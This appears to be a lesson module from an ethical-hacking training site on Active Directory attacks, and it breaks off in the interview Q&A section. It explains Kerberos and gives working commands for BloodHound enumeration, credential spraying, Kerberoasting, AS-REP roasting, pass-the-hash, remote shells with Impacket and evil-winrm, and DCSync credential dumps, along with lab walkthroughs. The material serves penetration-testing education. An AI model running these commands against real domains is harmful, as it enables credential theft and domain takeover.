window.PREP_SITE.registerTopic({
  id: 'eh-activedirectory',
  module: 'eh',
  title: 'Active Directory Attacks',
  estimatedReadTime: '34 min',
  tags: ['ethical-hacking', 'security', 'pentest', 'active-directory', 'kerberos', 'kerberoasting', 'bloodhound', 'impacket', 'dcsync', 'adcs'],
  sections: [

// ─────────────────────────────────────────────────────────────
{ id: 'tldr', title: '🎯 TL;DR', collapsible: false, html: `
<div class="callout danger">
  <div class="callout-title">⚠️ Domain Controllers are the crown jewel — treat this topic accordingly</div>
  <p>Everything in this topic targets a domain's actual trust fabric — Kerberos, LDAP, and the domain controllers (DCs) that arbitrate both. Compromising a single low-privileged domain account can, through the techniques here, chain into full domain compromise, and some of these techniques (DCSync, golden tickets) grant persistent, domain-wide access that survives ordinary remediation like password resets. That makes this the single highest-blast-radius topic in the module. Only ever practice it in your own isolated lab domain (built per Foundations, Ethics &amp; Legal) or under a Rules of Engagement that explicitly names domain-controller-targeting techniques as in scope — many organizations treat "tester obtained DCSync rights" or "tester forged a ticket" as a critical finding requiring immediate, separate notification, not something to wait for the final report.</p>
</div>
<p>This topic covers the internal, credential-and-trust-abuse techniques a tester runs once they have a foothold inside an Active Directory environment — the classic "assumed breach" starting point for an internal engagement — and wants to answer the question every AD assessment ultimately asks: <em>can a low-privileged domain user reach Domain Admin, and how?</em></p>
<ul>
  <li><strong>Enumeration</strong> — <strong>BloodHound</strong> (with the <strong>SharpHound</strong> collector) maps the domain as an attack-path graph; <strong>PowerView</strong> and <strong>ldapdomaindump</strong> pull the same underlying LDAP data in script- and report-friendly forms; <strong>netexec</strong> (the actively maintained successor to the now-archived <strong>crackmapexec</strong>) sweeps hosts for access, shares, and credential validity.</li>
  <li><strong>Kerberos credential attacks</strong> — <strong>Kerberoasting</strong> (Impacket's <code>GetUserSPNs.py</code>) and <strong>AS-REP roasting</strong> (<code>GetNPUsers.py</code>) both extract offline-crackable material straight out of normal Kerberos ticket exchanges, no exploit required.</li>
  <li><strong>Lateral movement</strong> — <strong>Pass-the-Hash</strong> and <strong>Pass-the-Ticket</strong> reuse captured credential material instead of a plaintext password, driven through Impacket's <code>psexec.py</code>/<code>wmiexec.py</code> or <strong><code>evil-winrm</code></strong>.</li>
  <li><strong>Escalation</strong> — Kerberos <strong>delegation abuse</strong> (unconstrained, constrained, resource-based) and <strong>ADCS ESC1</strong> (a certificate-template misconfiguration) are both covered conceptually, as the mechanics behind a large share of real-world AD privilege-escalation findings.</li>
  <li><strong>Domain dominance</strong> — <strong>DCSync</strong> (Impacket's <code>secretsdump.py</code>) and <strong>golden/silver tickets</strong> are covered <em>conceptually</em> here — what they are, why they're dangerous, and how to defend against them — deliberately without turnkey forge recipes, since these are the techniques that turn a test into domain-wide, hard-to-remediate persistence.</li>
</ul>
<p><strong>Mantra:</strong> "Kerberos trusts whoever holds the right key — enumerate to find the weakest key in the domain, and every defense in this topic exists to make keys harder to steal, shorter-lived, and easier to notice being misused."</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'what-why', title: '🧠 What & Why', html: `
<h3>What Active Directory actually is</h3>
<p><strong>Active Directory (AD)</strong> is Microsoft's directory service for Windows-centric networks: a hierarchical database of users, computers, groups, and policies (organized into <strong>domains</strong>, which can be grouped into a <strong>forest</strong> with trust relationships between them), served by one or more <strong>domain controllers (DCs)</strong>. Every domain-joined machine and user authenticates against a DC, and every access-control decision in the domain — who can log into which machine, who's a member of which group, who can read or write which object — ultimately traces back to data AD stores and Kerberos tickets AD issues. That centrality is exactly why AD is the top target in almost every internal engagement: compromise the directory, and you've effectively compromised policy enforcement for the entire environment.</p>

<h3>Kerberos in Active Directory: the trust backbone this whole topic abuses</h3>
<p>AD's default authentication protocol is <strong>Kerberos</strong>, and nearly every technique in this topic is really an abuse of one step in its normal flow, not a bug in the protocol itself:</p>
<ul>
  <li><strong>KDC (Key Distribution Center)</strong> — a service that runs on every domain controller, combining two roles: the <strong>AS (Authentication Service)</strong>, which verifies an identity and issues a <strong>TGT</strong>, and the <strong>TGS (Ticket Granting Service)</strong>, which exchanges a valid TGT for a ticket to a specific service.</li>
  <li><strong>TGT (Ticket Granting Ticket)</strong> — proof "this identity already authenticated," issued by the AS after a successful <strong>AS-REQ</strong>/<strong>AS-REP</strong> exchange, encrypted with the secret key of the special <code>krbtgt</code> domain account (never a real user's password) so only the KDC itself can ever validate or reissue tickets from it.</li>
  <li><strong>TGS / service ticket</strong> — issued by the TGS after a <strong>TGS-REQ</strong>/<strong>TGS-REP</strong> exchange (presenting a valid TGT plus the target service's identifier), and encrypted with the <em>target service account's own</em> secret key — a detail that turns out to matter a great deal later in this topic.</li>
  <li><strong>SPN (Service Principal Name)</strong> — the identifier that names a specific service instance (e.g. <code>MSSQLSvc/db01.corp.local:1433</code>) and is bound to whichever account actually runs that service; a TGS-REQ for an SPN tells the KDC exactly which account's key to encrypt the resulting service ticket with.</li>
</ul>
<p>Kerberos's core design assumption is that only the KDC and the account whose key was used can ever produce or read data encrypted with that key — but that same design means <strong>anyone who legitimately obtains a copy of an encrypted ticket can try to crack it offline</strong>, entirely disconnected from the DC, with no lockout policy or rate limit slowing them down. That single fact underlies Kerberoasting, AS-REP roasting, and (conceptually) golden/silver ticket forgery alike.</p>

<h3>Why AD is the highest-value target in an internal engagement</h3>
<p>Reconnaissance and Scanning &amp; Enumeration (earlier topics in this module) typically get a tester to one thing: a foothold, often as a low-privileged domain user or a single compromised workstation. Real internal engagements almost always start from that "assumed breach" position rather than from zero, because it's realistic — phishing, a leaked credential, or a single unpatched workstation is a far more common initial-access vector in practice than a direct external DC compromise. From that single foothold, this topic's techniques exist to answer the question that actually matters to the client: how far can that one compromised account or host reach, and specifically, can it become Domain Admin? A single misconfigured ACL, an over-privileged service account, or a forgotten delegation setting is often all that stands between "one user account" and "the entire domain," which is exactly the asymmetry AD-focused engagements are built to find and report before a real attacker does.</p>

<h3>The credential-abuse pattern underneath almost every technique here</h3>
<p>Zoom out far enough and nearly every technique in this topic is a variation on one idea: <strong>Kerberos tickets and NTLM credential material are just bytes secured by an account's secret key — if you can get a copy, you can attack that copy offline, or replay it, without ever needing the account's actual plaintext password.</strong> Kerberoasting and AS-REP roasting get a copy through completely legitimate-looking Kerberos traffic. Pass-the-Hash and Pass-the-Ticket reuse material already captured (from a memory dump, a previous compromise, or Responder — covered in Network Attacks). DCSync gets a copy by asking a DC to replicate it, the same way DCs do for each other. Golden and silver tickets go one step further and fabricate that material from scratch once the right secret key is already known. Recognizing this shared shape makes the specific tool syntax in Mechanics much easier to retain.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mental-model', title: '🗺️ Mental Model', html: `
<h3>The Kerberos flow, and exactly where each attack hooks in</h3>
<pre><code class="language-text">Client                              KDC (on a Domain Controller)
  │                                        │
  │──── 1. AS-REQ (I am user X) ─────────▶│  AS-REP roasting targets THIS step:
  │                                        │  if X has "no pre-auth required" set,
  │◀──── 2. AS-REP (here's a TGT,   ──────│  part of the AS-REP is crackable offline
  │        encrypted with krbtgt key)     │  with no valid credentials at all.
  │                                        │
  │──── 3. TGS-REQ (TGT + SPN) ───────────▶│  Kerberoasting targets THIS step:
  │                                        │  ANY authenticated user can request a
  │◀──── 4. TGS-REP (service ticket, ─────│  service ticket for ANY registered SPN —
  │        encrypted with SERVICE          │  the returned ticket is encrypted with
  │        ACCOUNT's own key)              │  that service account's own secret key.
  │                                        │
  │──── 5. Present service ticket ────────▶│  Service accepts the ticket without
  │        directly to the target service  │  ever talking to the KDC again.

Golden ticket  = a forged TGT, skipping steps 1–2 entirely (requires the krbtgt key).
Silver ticket  = a forged service ticket, skipping steps 3–4 entirely (requires
                 that one service account's key) — so step 5 never touches the KDC,
                 which is what makes silver tickets harder to spot centrally.
DCSync         = unrelated to this flow — it asks a DC directly, via the
                 replication protocol DCs use with each other, to hand over
                 account secrets (including krbtgt's) outright.</code></pre>

<h3>One engagement lifecycle (from Foundations), AD-specific verbs</h3>
<table>
  <thead><tr><th>Lifecycle stage</th><th>AD-specific technique</th></tr></thead>
  <tbody>
    <tr><td>Reconnaissance / Enumeration</td><td>BloodHound + SharpHound, PowerView, <code>ldapdomaindump</code>, netexec</td></tr>
    <tr><td>Initial credential access</td><td>Kerberoasting, AS-REP roasting (both extract crackable material from normal Kerberos traffic)</td></tr>
    <tr><td>Lateral movement</td><td>Pass-the-Hash, Pass-the-Ticket, Impacket suite, <code>evil-winrm</code></td></tr>
    <tr><td>Privilege escalation</td><td>Delegation abuse (unconstrained/constrained/RBCD), ADCS ESC1</td></tr>
    <tr><td>Domain dominance / persistence</td><td>DCSync, golden &amp; silver tickets (both covered conceptually)</td></tr>
  </tbody>
</table>

<h3>BloodHound's graph model: the same domain data, seen the way an attacker sees it</h3>
<p>LDAP data on its own (users, groups, computers, ACLs) is just a flat, tedious-to-cross-reference database. BloodHound's core idea is to model that same data as a <strong>graph</strong>: users, groups, and computers become <strong>nodes</strong>, and every real-world privilege relationship — group membership, "has an active session on," "can RDP to," "has <code>GenericAll</code>/<code>WriteDacl</code> over," "can be delegated to" — becomes a directed <strong>edge</strong>. Once the graph is populated, a question that's nearly impossible to answer by eye ("is there ANY path, however indirect, from this one low-privileged user to Domain Admins?") becomes a single graph query: find the shortest path between two nodes. This graph-first mental model is worth internalizing on its own, independent of the specific tool — it's the lens the rest of Mechanics' escalation techniques (delegation abuse, ADCS) are found through in real engagements.</p>

<h3>Why domain-dominance techniques get a different level of caution</h3>
<p>Every other technique in this topic targets one account or one host at a time. DCSync and golden/silver tickets are qualitatively different: they can grant access to <em>any</em> account, on <em>any</em> host, for as long as the attacker chooses — and, in the golden-ticket case, that access can persist even through a full password reset of the impersonated account, because what was forged is trust in the <code>krbtgt</code> key itself, not any single user's password. That's the reason this module treats them conceptually (what they are, why they work, how to defend) rather than as commands to run — the goal is to recognize and defend against them, not to hand over a copy-paste path to unremediable domain compromise.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'mechanics', title: '⚙️ Tools & Techniques', html: `
<h3>Enumeration: BloodHound (Community Edition) + SharpHound</h3>
<p><strong>BloodHound Community Edition (BHCE)</strong>, the actively developed, Docker/Neo4j-based current version, replaced the older desktop "BloodHound Legacy" — the two use incompatible collector formats, so match the collector version to whichever BloodHound server is running. <strong>SharpHound</strong> is the C# data collector that walks LDAP and, optionally, individual hosts to gather sessions, group memberships, and ACLs:</p>
<pre><code class="language-bash"># Run the SharpHound CE collector from a domain-joined (or domain-reachable) host:
SharpHound.exe -c All --zipfilename loot.zip

# Python-based collector alternative, handy from a Linux attack box:
bloodhound-python -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -ns &lt;dc-ip&gt; -c All

# Upload the resulting zip via the BloodHound CE web UI, then run a built-in
# query ("Shortest Paths to Domain Admins") or custom Cypher, e.g.:
#   MATCH p=shortestPath((u:User {name:'LOWPRIV@CORP.LOCAL'})-[*1..]-&gt;(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p</code></pre>

<h3>Enumeration: PowerView</h3>
<p>Part of PowerSploit, <strong>PowerView</strong> wraps raw LDAP/ADSI queries into readable PowerShell cmdlets — the scriptable, filterable alternative to BloodHound's graph view, still very commonly used for quick, targeted lookups:</p>
<pre><code class="language-bash">Get-DomainUser -SPN                          # users with an SPN set (Kerberoastable candidates)
Get-DomainUser -PreauthNotRequired            # users with Kerberos pre-auth disabled (AS-REP roastable)
Get-DomainComputer -Unconstrained             # computers trusted for unconstrained delegation
Get-DomainGroupMember -Identity "Domain Admins"
Find-DomainUserLocation                       # correlate active sessions with privileged group membership</code></pre>

<h3>Enumeration: ldapdomaindump</h3>
<p><code>ldapdomaindump</code> pulls the same underlying LDAP data (users, groups, computers, trusts, policies) and renders it as browsable, shareable HTML/JSON/greppable output — well suited to quick offline review or attaching to a report, without standing up a BloodHound instance:</p>
<pre><code class="language-bash">ldapdomaindump -u '&lt;domain&gt;\\&lt;user&gt;' -p '&lt;password&gt;' &lt;dc-ip&gt;</code></pre>

<h3>Enumeration &amp; rapid access checks: netexec (crackmapexec's actively maintained successor)</h3>
<p><strong>netexec (nxc)</strong> is the current, actively maintained tool for sweeping a network for reachable hosts, valid credentials, shares, and running lightweight modules against many hosts at once. <strong>crackmapexec</strong> was the tool that pioneered this workflow and is the name still seen in a lot of older write-ups, but its original maintainer retired from the project and it has been archived/unmaintained since 2023 — netexec is a community-driven continuation of the same codebase and command surface, so the syntax below will look familiar to anyone who's used crackmapexec before:</p>
<pre><code class="language-bash">netexec smb &lt;dc-ip&gt; -u &lt;user&gt; -p &lt;password&gt;              # validate one credential against SMB
netexec smb &lt;target&gt; -u &lt;user&gt; -H &lt;hash&gt;                  # same check, but via an NTLM hash (Pass-the-Hash)
netexec smb &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt; --shares      # enumerate accessible SMB shares
netexec ldap &lt;dc-ip&gt; -u &lt;user&gt; -p &lt;password&gt; --users        # dump domain users via LDAP
netexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p &lt;password&gt;             # spray one credential across a whole subnet</code></pre>

<h3>Kerberoasting</h3>
<p>Any authenticated domain user can request a TGS-REQ for any account's SPN — that's normal, by-design Kerberos behavior, not a flaw. What makes it exploitable is that the returned service ticket is encrypted with the <em>service account's own secret key</em> (derived from its password), so an attacker can request tickets for every SPN-bearing account in the domain, then crack those tickets completely offline, with no domain interaction, no lockout policy, and no rate limiting after the initial request:</p>
<pre><code class="language-bash"># Request TGS tickets for every SPN-bearing account and print them hashcat-ready:
GetUserSPNs.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt; -request

# Save output to a file instead of stdout:
GetUserSPNs.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt; -request -outputfile kerberoastable.txt

# Crack offline with hashcat (mode 13100 = RC4-encrypted TGS-REP, by far the
# most common case; modern AES-only domains produce mode 19600/19700 hashes
# instead, which are far more expensive to crack given a strong password):
hashcat -m 13100 kerberoastable.txt wordlist.txt</code></pre>
<p>The real-world defense angle matters here as much as the attack: any service account with a weak or old, human-chosen password is the entire vulnerability — this technique doesn't work at all against an account with a long, random, or auto-rotated password (see gMSA in Defenses &amp; Legal).</p>

<h3>AS-REP Roasting</h3>
<p>If an account has the "Do not require Kerberos preauthentication" flag set — sometimes deliberately, for compatibility with older Kerberos clients, more often by accident — an attacker can send an AS-REQ for that username with <em>no credentials at all</em>, and the KDC will return an AS-REP whose encrypted portion is crackable offline exactly like a Kerberoasted ticket, since normal Kerberos requires a valid pre-auth timestamp precisely to prevent this:</p>
<pre><code class="language-bash"># Unauthenticated: only requires a list of candidate usernames, no valid
# credential of any kind — this is the version that needs zero domain access:
GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -no-pass -dc-ip &lt;dc-ip&gt; -format hashcat -outputfile asrep.txt

# Authenticated variant, if you already hold one valid credential and want to
# enumerate every pre-auth-disabled account via LDAP instead of guessing names:
GetNPUsers.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -request -dc-ip &lt;dc-ip&gt;

# Crack offline (mode 18200 = RC4 AS-REP; AES-enforced domains produce a
# different, far more expensive mode):
hashcat -m 18200 asrep.txt wordlist.txt</code></pre>

<h3>Pass-the-Hash and Pass-the-Ticket</h3>
<p>Both techniques reuse credential material that's already been captured — from a memory dump, a prior compromise, or a technique like Responder (Network Attacks) — instead of a plaintext password. <strong>Pass-the-Hash (PtH)</strong> authenticates using an NTLM hash directly; <strong>Pass-the-Ticket (PtT)</strong> reuses an already-issued Kerberos ticket. Impacket's tools accept either in place of a password:</p>
<pre><code class="language-bash"># Pass-the-Hash with Impacket's psexec.py / wmiexec.py (either accepts -hashes
# LM:NT — the LM half can be left as all zeroes on modern Windows):
psexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;
wmiexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;

# Pass-the-Ticket: point Impacket at an already-obtained Kerberos ticket
# (a .ccache file) via the KRB5CCNAME environment variable and -k -no-pass,
# instead of supplying any password or hash at all:
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</code></pre>
<p>On Windows-native tooling the same two ideas are commonly driven through Mimikatz (for extracting and injecting tickets/hashes from LSASS) or Rubeus (for requesting, exporting, and replaying Kerberos tickets) — mentioned here only for context on what an equivalent Windows-side workflow looks like; this module's hands-on command coverage stays on the cross-platform Impacket/evil-winrm tooling above.</p>

<h3>Access: the Impacket suite and evil-winrm, together</h3>
<p>Once a working credential (password, hash, or ticket) is in hand, these are the standard ways to actually get a shell or run commands:</p>
<pre><code class="language-bash"># Impacket psexec.py — drops and runs a service binary via SMB/RPC (loud,
# leaves a service artifact), gives a SYSTEM-level shell:
psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;

# Impacket wmiexec.py — uses WMI instead (semi-interactive, no service
# artifact, generally quieter than psexec.py):
wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;

# Impacket secretsdump.py — against a single (non-DC) host, dumps local
# SAM + cached credentials once you already have admin-equivalent access:
secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt;

# evil-winrm — a full interactive PowerShell-like shell over WinRM, the
# most commonly used tool when WinRM (port 5985/5986) is reachable:
evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt;
evil-winrm -i &lt;target&gt; -u &lt;user&gt; -H &lt;hash&gt;               # Pass-the-Hash over WinRM</code></pre>

<h3>Delegation abuse: unconstrained, constrained, and resource-based (conceptual)</h3>
<p>Kerberos <strong>delegation</strong> lets a service impersonate a user to a second service on that user's behalf (e.g. a web front-end impersonating a user to a back-end database) — a legitimate, necessary feature that comes in three flavors with very different blast radii:</p>
<ul>
  <li><strong>Unconstrained delegation</strong> — a host trusted for unconstrained delegation can impersonate any user to <em>any</em> other service in the domain, and as a side effect, a full copy of the TGT of anyone who authenticates to it gets cached in that host's memory. That makes any host configured this way an extremely high-value target: compromising it means potentially harvesting the TGT of whoever connects next — including, if a domain admin ever authenticates there for any reason, effective domain compromise. This is why disabling unconstrained delegation wherever it isn't strictly required is one of the highest-leverage defensive changes covered in Defenses &amp; Legal.</li>
  <li><strong>Constrained delegation</strong> — narrows the same idea to a pre-approved, explicit list of target services (via the Kerberos S4U2Self/S4U2Proxy extensions), so a compromised delegating service can only impersonate users to that specific short list — a much smaller blast radius than unconstrained delegation.</li>
  <li><strong>Resource-based constrained delegation (RBCD)</strong> — flips where the trust is configured: instead of the front-end service declaring what it's allowed to delegate to, the <em>target</em> resource's own computer object (via its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute) declares who's allowed to delegate to it. This becomes an escalation path whenever an attacker already holds write access (e.g. <code>GenericWrite</code>/<code>GenericAll</code>) over a computer object — a permission that's easy to grant accidentally and easy for BloodHound to surface — because that write access alone can be used to configure delegation onto that computer without ever touching the front-end service at all.</li>
</ul>

<h3>ADCS ESC1: certificate-template misconfiguration overview</h3>
<p>Active Directory Certificate Services (ADCS) issues X.509 certificates that AD trusts for client authentication (via Kerberos PKINIT) exactly the way it trusts a password — a valid certificate <em>is</em> a credential. <strong>ESC1</strong> (using the naming from SpecterOps' original ADCS abuse research) is the most common and highest-impact template misconfiguration: a certificate template that simultaneously (1) allows a low-privileged principal to enroll, (2) has the <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag set, letting the requester supply their <em>own</em> Subject Alternative Name rather than the CA deriving it from the requester's real identity, and (3) includes a Client Authentication EKU. Combined, those three conditions let any user who can enroll request a certificate while naming an arbitrary UPN — a domain admin's, for example — in the SAN field; the CA issues a technically valid certificate for that name, which can then authenticate as that account, without ever touching its real password:</p>
<pre><code class="language-bash"># Certipy — read-only audit of a CA's templates for ESC1 (and other known
# ESC#) misconfigurations; this is an enumeration/audit action, not exploitation:
certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc-ip&gt; -vulnerable -stdout</code></pre>
<p>ESC1 is one of over a dozen documented ADCS abuse variants (ESC2 through ESC16 and counting) — this topic covers ESC1 as the canonical, most-cited example; a dedicated ADCS assessment would enumerate for all known variants.</p>

<h3>DCSync: replicating credentials via the Directory Replication Service</h3>
<p>Domain controllers keep each other in sync using the Directory Replication Service Remote Protocol (MS-DRSR). The two AD rights that authorize this — <strong>Replicating Directory Changes</strong> and <strong>Replicating Directory Changes All</strong> — are, by default, held only by domain controllers themselves and a small number of built-in privileged groups. <strong>DCSync</strong> is the technique of using that same protocol to ask a DC to replicate account secrets — including the <code>krbtgt</code> account's own key — to a principal that already holds those two rights, whether by design or by an over-permissioned ACL delegated somewhere along the way. In practice, DCSync is almost always a <em>validation</em> step during an engagement (proof that a specific already-compromised account or group carries replication rights it shouldn't) rather than an initial-access shortcut — Impacket's <code>secretsdump.py</code> is the standard tool, and it automatically uses the DCSync method whenever it's pointed at a domain controller with a credential that holds those rights:</p>
<pre><code class="language-bash"># secretsdump.py auto-detects and performs a DCSync-style replication dump
# when run against a DC with an account that already holds the two
# Replicating Directory Changes rights above:
secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc-ip&gt;

# Target a single account instead of the whole domain — a lower-impact,
# often preferable way to prove the finding during a scoped engagement:
secretsdump.py -just-dc-user &lt;target-user&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc-ip&gt;</code></pre>
<p>Treat a successful DCSync as a critical finding on its own: it means the tested account (or a group it belongs to) can silently harvest every credential in the domain, including <code>krbtgt</code>, without ever needing interactive access to a domain controller. See Defenses &amp; Legal for how this right typically gets misconfigured and how defenders detect its use.</p>

<h3>Golden and silver tickets — explained conceptually</h3>
<p>These are deliberately covered here as concepts, not commands — what they are, why they matter, and how to defend against them, without a step-by-step forge recipe.</p>
<p>A <strong>golden ticket</strong> is a forged TGT, built entirely offline without ever contacting a KDC — possible once an attacker already holds the <code>krbtgt</code> account's secret key (commonly obtained via DCSync, above). Because a TGT is just data encrypted and signed with that one key, whoever holds it can fabricate a TGT asserting <em>any</em> identity, <em>any</em> group memberships, and <em>any</em> validity window they choose, and every service in the domain will accept it exactly as if the KDC had issued it — because cryptographically, nothing distinguishes a forged ticket from a real one.</p>
<p>A <strong>silver ticket</strong> is the narrower sibling: instead of forging a TGT with the <code>krbtgt</code> key, it forges a service ticket directly, using one specific service account's own key. Its reach is limited to whatever service that one account runs, but it's arguably stealthier still, because using a forged service ticket never involves the KDC at all (see the Mental Model diagram) — no AS-REQ or TGS-REQ traffic to a DC is generated by presenting it.</p>
<p>What makes both genuinely dangerous is that they bypass the KDC's real-time policy checks entirely — a disabled account, an expired password, or a removed group membership doesn't invalidate an already-forged ticket, because the KDC is never consulted again once the ticket exists. The only real remediation for a golden ticket, once <code>krbtgt</code> is confirmed exposed, is rotating the <code>krbtgt</code> secret <em>twice</em> in succession (a single rotation still leaves the previous key valid for a grace period) — which is exactly why any suspected DCSync or credential-dump event against a DC has to be treated as urgently as a confirmed golden ticket, covered further in Defenses &amp; Legal.</p>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'examples', title: '🧪 Worked Examples', html: `
<h3>Example 1 — Enumerating a shortest path to Domain Admin with BloodHound (lab domain)</h3>
<p>Continuing the isolated lab pattern from Foundations, Ethics &amp; Legal, with a small lab domain (one DC, a couple of member servers) and one intentionally low-privileged foothold account:</p>
<pre><code class="language-bash"># 1. Collect data from a domain-joined foothold host:
SharpHound.exe -c All --zipfilename loot.zip

# 2. Upload loot.zip into the BloodHound CE web UI (its own Docker-based
#    Neo4j graph database ingests it automatically).

# 3. Run the built-in "Shortest Paths to Domain Admins" query, or the
#    equivalent custom Cypher, from the foothold account's node:
#      MATCH p=shortestPath((u:User {name:'LOWPRIV@LAB.LOCAL'})-[*1..]-&gt;(g:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})) RETURN p

# 4. The graph reveals, e.g.: LOWPRIV is a member of a group with
#    GenericWrite over a computer object that's trusted for unconstrained
#    delegation — a concrete, reproducible escalation path to hand to the
#    client, instead of a vague "AD is probably misconfigured somewhere."</code></pre>
<p>Notice what this example demonstrates operationally: enumeration alone, no exploitation yet, already produced a specific, reproducible finding — exactly the kind of evidence a pentest report needs, and exactly why BloodHound is typically the very first tool run once a foothold exists.</p>

<h3>Example 2 — Kerberoasting a service account end to end (lab domain)</h3>
<pre><code class="language-bash"># 1. Enumerate SPN-bearing (Kerberoastable) accounts as the foothold user:
GetUserSPNs.py lab.local/lowpriv:LowPrivPass1 -dc-ip 192.168.56.10

# 2. Request and save the crackable TGS tickets for every SPN account found:
GetUserSPNs.py lab.local/lowpriv:LowPrivPass1 -dc-ip 192.168.56.10 -request -outputfile kerberoastable.txt

# 3. Crack offline, completely disconnected from the domain (mode 13100 = RC4 TGS-REP):
hashcat -m 13100 kerberoastable.txt rockyou.txt
# → svc_sql's weak, human-chosen lab password cracks quickly

# 4. Validate the cracked credential and check its reach with netexec:
netexec smb 192.168.56.0/24 -u svc_sql -p 'CrackedPassword123' --shares
# → demonstrates exactly why a weak, human-chosen service-account password
#   (rather than a gMSA — see Defenses &amp; Legal) is the actual vulnerability here,
#   not Kerberos itself.</code></pre>

<h3>Example 3 — AS-REP roasting a pre-auth-disabled account (lab domain)</h3>
<pre><code class="language-bash"># 1. Enumerate candidate usernames first (from BloodHound/PowerView/ldapdomaindump
#    output collected earlier), saved one per line to users.txt.

# 2. Attempt unauthenticated AS-REP roasting — no valid credential required
#    for this step at all:
GetNPUsers.py lab.local/ -usersfile users.txt -no-pass -dc-ip 192.168.56.10 -format hashcat -outputfile asrep.txt
# → only accounts with "Do not require Kerberos preauthentication" set return
#   a crackable hash; everyone else is silently skipped

# 3. Crack offline (mode 18200 = RC4 AS-REP):
hashcat -m 18200 asrep.txt rockyou.txt
# → confirms the same lesson as Kerberoasting: the fix isn't disabling
#   Kerberos, it's not disabling pre-auth on accounts that don't need it,
#   and enforcing strong passwords on the ones that do.</code></pre>

<h3>Example 4 — Turning a cracked credential into lateral access (lab domain)</h3>
<pre><code class="language-bash"># 1. Confirm the cracked credential's access footprint first (read-only check):
netexec smb 192.168.56.20 -u svc_sql -p 'CrackedPassword123'
# → confirms local admin rights on the target host

# 2. Get an interactive shell via evil-winrm (if WinRM is reachable):
evil-winrm -i 192.168.56.20 -u svc_sql -p 'CrackedPassword123'

# 3. Alternatively, via Impacket if only SMB is reachable:
wmiexec.py lab.local/svc_sql:CrackedPassword123@192.168.56.20

# 4. Once local admin access on a host is confirmed, dump local secrets
#    to check for credential reuse (a separate, local-only action —
#    NOT the DCSync technique, which targets a domain controller directly):
secretsdump.py lab.local/svc_sql:CrackedPassword123@192.168.56.20
# → if the local Administrator hash matches other hosts in the lab
#   (common when a golden image ships an identical local admin password),
#   that single foothold credential just became a much larger one —
#   exactly the risk LAPS (Defenses &amp; Legal) exists to close off.</code></pre>
`},

// ─────────────────────────────────────────────────────────────
{ id: 'interview-patterns', title: '🎤 Interview Patterns', html: `
<div class="qa-block">
<div class="qa-q">Walk me through the Kerberos AS-REQ/AS-REP/TGS-REQ/TGS-REP flow, and where Kerberoasting and AS-REP roasting each hook in.</div>
<div class="qa-a">
<p>A client first sends an AS-REQ to the KDC's Authentication Service proving its identity (normally via an encrypted pre-auth timestamp), and gets back an AS-REP containing a TGT encrypted with the krbtgt account's key. To reach an actual service, the client then presents that TGT in a TGS-REQ naming the target service's SPN, and the KDC's Ticket Granting Service returns a TGS-REP containing a service ticket — critically, encrypted with the target service account's own key, not the krbtgt key. Kerberoasting hooks into the TGS-REQ/TGS-REP step: any authenticated user can request a ticket for any SPN, and since the returned ticket is encrypted with the service account's password-derived key, it can be cracked offline if that password is weak. AS-REP roasting hooks into the AS-REQ/AS-REP step instead: if an account has Kerberos pre-authentication disabled, an attacker can request an AS-REP for that username with no credentials at all, and part of that AS-REP is crackable offline the same way.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What's the difference between Pass-the-Hash and Pass-the-Ticket?</div>
<div class="qa-a">
<p>Both let an attacker authenticate using credential material captured earlier instead of a plaintext password, but the material is different. Pass-the-Hash reuses an NTLM hash directly — tools like Impacket's psexec.py or wmiexec.py accept a hash in place of a password and complete NTLM authentication with it, without ever needing the real password. Pass-the-Ticket instead reuses an already-issued Kerberos ticket (typically exported from memory or a .ccache file) — Impacket tools accept this via the KRB5CCNAME environment variable and a -k -no-pass flag, presenting the existing ticket rather than authenticating from scratch. Both avoid ever needing the plaintext password; they just operate on two different kinds of already-captured credential material.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What is DCSync, and why is it dangerous even though it doesn't forge or exploit anything?</div>
<div class="qa-a">
<p>DCSync abuses the Directory Replication Service Remote Protocol that domain controllers legitimately use to stay in sync with each other. Two AD rights — Replicating Directory Changes and Replicating Directory Changes All — authorize a principal to request that replication data, and by default only DCs and a small set of built-in privileged groups hold them. DCSync is simply requesting that same replication data while holding those rights, whether by design or by a misconfigured/over-delegated ACL — nothing is forged or exploited in the traditional sense; it's a legitimate protocol used by a principal who shouldn't have been granted the rights to use it. It's dangerous because a successful DCSync yields every account's password material in the domain, including the krbtgt account's key — which is the exact prerequisite for forging a golden ticket — so it's typically treated as a critical finding and a validation step confirming a compromised account's real blast radius, rather than something used for initial access.</p>
</div>
</div>

<div class="qa-block">
<div class="qa-q">What's the difference between a golden ticket and a silver ticket?</div>
<div class="qa-a">
